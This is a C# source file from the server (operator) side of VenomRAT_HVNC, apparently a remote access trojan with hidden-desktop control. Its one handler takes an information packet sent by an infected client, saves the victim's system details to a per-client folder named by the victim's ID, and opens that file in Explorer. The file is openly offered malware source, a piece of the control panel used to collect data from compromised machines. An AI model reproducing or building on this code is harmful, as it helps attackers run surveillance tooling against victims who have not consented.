using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using Server.MessagePack;
using VenomRAT_HVNC.Server.Connection;

namespace VenomRAT_HVNC.Server.Handle_Packet
{
    public class HandleInformation
    {
        public void AddToInformationList(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                string text = Path.Combine(Application.StartupPath, "ClientsFolder\\" + unpack_msgpack.ForcePathObject("ID").AsString + "\\Information");
                string text2 = text + "\\Information.txt";
                if (!Directory.Exists(text))
                {
                    Directory.CreateDirectory(text);
                }
                File.WriteAllText(text2, unpack_msgpack.ForcePathObject("InforMation").AsString);
                Process.Start("explorer.exe", text2);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }
    }
}
